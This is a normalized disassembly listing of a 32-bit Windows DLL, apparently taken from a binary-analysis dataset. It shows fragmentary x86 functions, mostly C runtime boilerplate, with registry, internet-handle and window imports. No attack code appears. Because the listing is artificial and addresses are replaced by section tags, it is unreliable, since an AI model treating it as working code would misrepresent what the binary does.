push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_10002493
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_100024af
mov eax esi
pop esi
retn 0x8
sub_10010f99
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
retn
inc eax
inc eax
dec [ esp + 0xc ]
jne r-xdata
mov cx [ eax ]
cmp cx [ esp + 0x8 ]
je r-xdata
sub_10011315
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_100114d1
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001ce5
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100114e9
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001cc8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10011779
push esi
mov esi ecx
call sub_10011795
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10011795
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
and [ esi + 0x4 ] 0x0
sub_10011bce
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10002597
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000ad5c
sub_10011bfb
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0xc
push eax
call sub_100020c6
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10011d7a
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_10011d93
push edi
push edi
push esi
call sub_100289c4
add esp 0xc
mov eax esi
retn
sub_10011dd9
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10011e55
mov [ ecx ] r--data
retn
sub_100120dd
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100132ab
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10012694
mov [ ecx ] r--data
jmp sub_10001cc8
sub_10012a80
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005dc7
mov [ esi ] r--data
pop esi
retn
sub_10012a96
mov al [ ecx + 0xc ]
retn
sub_10012a9a
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10012ab4
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10012ace
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001d1f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10012ae8
push esi
mov esi ecx
call sub_10012a80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10012d89
mov ecx [ ebp - 0x14 ]
call sub_10005dc7
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_10013210
xor eax eax
cmp [ esp + 0x8 ] eax
je r-xdata
retn
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
call sub_10006c97
sub_10013227
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100200e0
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_10007042
pop esi
retn 0x4
sub_100132a0
mov [ ecx ] r--data
jmp sub_100132ab
sub_1001335a
cmp [ esp + 0x4 ] 0x0
jne r-xdata
jmp sub_1001336c
xor eax eax
inc eax
retn 0x4
sub_100133a8
push [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
call [ eax + 0xc ]
retn
sub_100133b2
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
sub_100133bf
mov [ esi + 0x11 ] 0x1
mov eax [ esi + 0x14 ]
call sub_10028b8d
retn 0x4
sub_10013689
push esi
mov esi ecx
call sub_100136a5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10013828
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10013a08
push esi
mov esi ecx
call sub_10013a3f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10013a24
push [ esp + 0x8 ]
lea ecx [ esi + 0x4 ]
push [ esp + 0x8 ]
call sub_10010f73
mov [ esi ] r--data
mov eax esi
retn 0x8
sub_10013a3f
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_100023ce
retn
sub_10013de2
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10023a01
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10013e71
push esi
mov esi ecx
call sub_10013e8d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10013ef9
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100142b1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10013f8e
mov [ ecx ] r--data
jmp sub_100142b1
sub_10013f99
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100142b1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10013fbb
mov [ ecx ] r--data
jmp sub_100142b1
sub_10014044
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100142b1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10014066
mov [ ecx ] r--data
jmp sub_100142b1
sub_10014295
push esi
mov esi ecx
call sub_100142b1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100142b1
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
sub_100142ce
push r--data
mov ecx esi
call sub_1000ccf6
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
retn
lea eax [ esi + 0x4 ]
retn
mov eax [ esi + 0x4 ]
retn
sub_100143ed
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_10022f32
pop ecx
retn
sub_100143fe
cmp [ esp + 0x8 ] 0x0
je r-xdata
retn
push [ esp + 0x8 ]
call sub_100207fd
pop ecx
sub_1001ade4
push esi
mov esi ecx
call sub_1001ae00
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1001ae00
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov [ esi ] r--data
mov ecx esi
pop esi
jmp sub_100132ab
push eax
call [ DestroyWindow@IAT ]
j_sub_100241d9
jmp sub_100241d9
sub_1001b08e
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_1001c317
push [ esi ]
call sub_1002004f
pop ecx
pop ecx
pop esi
retn
sub_1001b0a5
push [ ecx ]
call sub_1001c327
pop ecx
retn
sub_1001b0ae
push [ ecx ]
call sub_1001c337
pop ecx
retn
sub_1001b25a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10024d30
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_10024d85
sub_1001b274
mov ecx [ ecx + 0x4 ]
call sub_10007b06
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1001b2f7
mov eax [ rw-data ]
retn
sub_1001b693
mov edi edi
push esi
call sub_100264e1
mov esi [ eax + 0x8 ]
call sub_10026495
mov edx eax
mov eax esi
pop esi
retn
sub_1001b933
push r-xdata
call sub_10024d30
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_1001c127
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001c0be
sub_1001c132
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10020186
sub_1001c307
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1001c317
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_1001c327
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_1001c337
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001c36d
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ rw-data ] eax
test ecx ecx
je r-xdata
retn
cmp eax 0xa
jb r-xdata
call [ eax * 4 + rw-data ]
sub_1001c3e0
xor eax eax
retn 0x4
sub_1001c460
mov eax [ ecx ]
push eax
call sub_100209c6
pop ecx
retn
sub_1001c470
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
add esp 0x4
sub_1001c580
push esi
mov esi ecx
call sub_1001c4f0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
add esp 0x4
sub_1001c7e0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1001c610
push esi
call sub_1002004f
add esp 0x4
sub_1001c8c4
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x24 ] 0x10
jb r-xdata
add eax 0x10
mov [ ebp - 0x14 ] eax
mov edx [ eax + 0x10 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax sub_1001c8e1
retn
sub_1001c8e1
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001c910
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push 0xffffffff
push 0x0
push eax
call sub_10002033
retn
sub_1001cd19
mov edx [ ebp + 0x8 ]
push edx
call sub_1001c7e0
add esp 0x4
push 0x0
push 0x0
call sub_10023a01
int3
sub_1001cd30
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1001c610
push esi
call sub_1002004f
add esp 0x4
sub_1001d209
mov ecx [ ebp - 0x14 ]
call sub_1001c800
mov [ ebp - 0x14 ] eax
mov eax sub_1001d21a
retn
sub_1001d21a
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001d2e6
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
call sub_1001c490
mov eax r-xdata
retn
sub_1001de20
mov eax 0x5
retn
sub_1001e310
push esi
push 0xffffffff
mov esi ecx
call sub_1001e240
push eax
mov ecx esi
call sub_10001e10
mov eax esi
pop esi
retn
sub_1001ea00
xor al al
retn
sub_1001ea10
xor eax eax
retn
sub_1001ea20
xor eax eax
retn 0x10
sub_1001ea30
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
add esp 0x4
sub_1001f360
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
retn 0x8
sub_1001f3b0
mov eax [ esp + 0x4 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
retn 0x8
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax 0x1
retn 0x8
sub_1001f3d0
mov eax r--data
retn
sub_1001f504
int3
sub_1001f510
mov eax [ ecx ]
push eax
call [ LocalFree@IAT ]
retn
sub_1001f520
mov eax r--data
retn
sub_1001f530
mov eax r--data
retn
sub_1001f540
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
add esp 0x4
sub_1002004f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100207fd
sub_1002016b
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_1002024f
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_100201eb
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_1002024f
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100202c9
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_100207fd
pop ecx
sub_100202df
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1002030a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1002026c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10020327
mov [ ecx ] r--data
jmp sub_100202c9
sub_1002037a
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_100277d4
pop ecx
retn
sub_10020442
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100207b7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10028b25
pop ecx
pop ecx
retn
sub_10020853
push 0x4
call sub_10028e74
pop ecx
retn
sub_100208a9
call sub_10027e84
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10025192
sub_100224c3
push esi
call sub_10023149
pop ecx
retn
sub_100226a5
push [ ebp + 0x14 ]
call sub_10023149
pop ecx
retn
sub_10022808
push [ ebp + 0xc ]
call sub_10023149
pop ecx
retn
sub_1002290e
push esi
call sub_10023149
pop ecx
retn
sub_10022a1b
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_10022bcc
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_10022d28
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10023185
pop ecx
pop ecx
retn
sub_10022d57
push 0x1
call sub_10028e74
pop ecx
retn
sub_10022da9
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_10022db3
push 0x1
call sub_10022c86
pop ecx
retn
sub_10022ea7
push esi
call sub_10023149
pop ecx
retn
sub_10022eaf
mov edi edi
push ebp
mov ebp esp
call sub_10027e84
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10022ec1
call sub_10027e84
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_10022f29
push 0x4
call sub_10028e74
pop ecx
retn
sub_100230b6
call sub_10022db3
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_100207fd
pop ecx
retn
call sub_1002c228
sub_100232c6
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_1002375c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10023731
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_10023774
push 0x8
call sub_10028f4e
pop ecx
retn
sub_1002377d
push 0x8
call sub_10028e74
pop ecx
retn
sub_10023963
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10028e74
pop ecx
sub_10023978
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1002384c
add esp 0xc
pop ebp
retn
sub_1002398e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1002384c
add esp 0xc
pop ebp
retn
sub_100239a4
push 0x1
push 0x0
push 0x0
call sub_1002384c
add esp 0xc
retn
sub_10023f0b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10023f1f
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10020040
jmp sub_10023f0b
sub_10023f2e
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10020040
jmp sub_10023f0b
sub_10023f5b
mov [ ecx ] r--data
jmp sub_100202c9
sub_100240b7
push [ ebp - 0x14 ]
call sub_10023fec
pop ecx
retn
sub_100240fb
call sub_10027e84
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10027e84
add eax 0x90
dec [ eax ]
sub_1002419e
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_100241a7
mov esp [ ebp - 0x18 ]
call sub_1002d5ed
sub_100241d9
call sub_10027e84
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne cl
mov al cl
retn
sub_10024267
push 0x4
mov eax sub_100479e1
call sub_10023e66
call sub_10027e84
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1002d626
call sub_1002d639
sub_10024340
mov eax [ ebp - 0x14 ]
call sub_10024116
retn
sub_100245b7
xor eax eax
inc eax
retn
sub_100245bb
mov esp [ ebp - 0x18 ]
call sub_1002d5ed
sub_10024650
xor eax eax
inc eax
retn
sub_10024654
mov esp [ ebp - 0x18 ]
call sub_1002d5ed
sub_10024b06
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1002026c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10024d2a
call sub_1002377d
retn
sub_10024d30
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10024cf4
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100251fc
push 0xc
call sub_10028e74
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10025308
push 0xd
call sub_10028e74
pop ecx
retn
sub_10025314
push 0xc
call sub_10028e74
pop ecx
retn
sub_10025fe1
push 0xc
call sub_10028e74
pop ecx
retn
sub_10025fed
push 0xc
call sub_10028e74
pop ecx
retn
sub_1002601e
and [ esi + 0x70 ] 0xffffffef
retn
sub_10026450
call sub_10027e84
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10025192
sub_10026479
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10026450
sub_10026495
call sub_10027e84
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10025192
sub_100264e1
call sub_10027e84
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10025192
sub_10026911
call sub_10027e84
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10025192
sub_10027234
mov eax sub_10031488
mov [ rw-data ] eax
mov [ rw-data ] sub_10030b6f
mov [ rw-data ] sub_10030b23
mov [ rw-data ] sub_10030b5c
mov [ rw-data ] sub_10030ac5
mov [ rw-data ] eax
mov [ rw-data ] sub_10031400
mov [ rw-data ] sub_10030ae1
mov [ rw-data ] sub_10030a43
mov [ rw-data ] sub_100309d0
retn
sub_10027294
mov edi edi
push ebp
mov ebp esp
call sub_10027234
call sub_10031514
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_100314ab
sub_100273d6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100272b7
add esp 0xc
pop ebp
retn
sub_100274a9
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_10027735
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002783b
push 0xe
call sub_10028e74
pop ecx
retn
sub_10027bb5
and [ rw-data ] 0x0
retn
sub_10027c2f
push 0x0
call sub_10027bbd
pop ecx
retn
sub_10027caa
call [ TlsAlloc@IAT ]
retn 0x4
sub_10027df9
push 0xd
call sub_10028e74
pop ecx
retn
sub_10027e02
push 0xc
call sub_10028e74
pop ecx
retn
sub_10027fb8
push 0xd
call sub_10028e74
pop ecx
retn
sub_10027fc4
push 0xc
call sub_10028e74
pop ecx
retn
sub_10028405
xor eax eax
inc eax
retn
sub_100289c4
retn
sub_10028b8d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10028e74
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10028f45
push 0xa
call sub_10028e74
pop ecx
retn
sub_1002aa21
push 0xc
push r--data
call sub_10028b48
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_1002aa3e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1002aad3
call sub_1002aa71
mov [ rw-data ] eax
xor eax eax
retn
sub_1002ae43
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002b6c0
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_1002b985
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_1002beb8
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_1002bfa3
push [ ebp + 0x8 ]
call sub_10023149
pop ecx
retn
sub_1002c0b5
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_1002c21e
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_1002c2be
push 0x1
call sub_10028e74
pop ecx
retn
sub_1002c3f6
push 0x1
call sub_10028e74
pop ecx
retn
sub_1002c4d6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1002c400
add esp 0xc
pop ebp
retn 0x4
sub_1002c509
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_100332d1
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1002c53c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1002c400
add esp 0xc
pop ebp
retn 0x8
sub_1002cc08
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_1002cfa3
push 0xd
call sub_10028e74
pop ecx
retn
sub_1002d36e
push 0xd
call sub_10028e74
pop ecx
retn
sub_1002d3a7
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1002d20d
pop ecx
mov [ rw-data ] 0x1
sub_1002d5bb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_1002d5ed
push 0x8
push r--data
call sub_10028b48
call sub_10027e84
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10024d85
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1002d60d
xor eax eax
inc eax
retn
sub_1002d626
call sub_10027e84
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1002d5ed
call eax
sub_1002d65d
xor eax eax
inc eax
retn
sub_1002d671
push sub_1002d5ed
call sub_10027bbd
pop ecx
mov [ rw-data ] eax
retn
sub_1002d682
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1002d6d7
push [ rw-data ]
call sub_10027c38
pop ecx
retn
sub_1002d858
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10028e74
pop ecx
sub_1002d894
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002d8a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1002d8d3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_1002d8ea
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
push 0x8
call [ SetLastError@IAT ]
sub_1002d96c
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1002da18
push 0x4
call sub_10028e74
pop ecx
retn
sub_1002e6ad
push 0x0
call sub_1002e5ad
pop ecx
retn
sub_1002e7b6
push 0x0
call sub_1002e6b6
pop ecx
retn
sub_1002eb16
push 0x0
call sub_1002e7bf
pop ecx
retn
sub_100303b6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10027570
sub_10030632
push 0x4
call sub_10028e74
pop ecx
retn
sub_10030798
push 0x4
call sub_10028e74
pop ecx
retn
sub_100309bd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10030985
pop ecx
pop ecx
pop ebp
retn
sub_10030b23
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030ae1
add esp 0x10
pop ebp
retn
sub_10030b5c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100309d0
pop ecx
pop ecx
pop ebp
retn
sub_10030b6f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10030a43
pop ecx
pop ecx
pop ebp
retn
sub_1003189b
mov eax rw-data
retn
sub_100318a1
mov eax rw-data
retn
sub_100318fa
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_100318a7
add esp 0x10
pop ebp
retn
sub_10031aa6
push [ ebp + 0x8 ]
call sub_10032ffb
pop ecx
retn
sub_10031b14
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10032dc3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10032cac
add esp 0x10
pop ebp
retn
sub_10032ff2
push 0xa
call sub_10028e74
pop ecx
retn
sub_100330f5
push 0xa
call sub_10028e74
pop ecx
retn
sub_100331b3
push 0xb
call sub_10028e74
pop ecx
retn
sub_100332a5
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_100331dc
jne r-xdata
retn
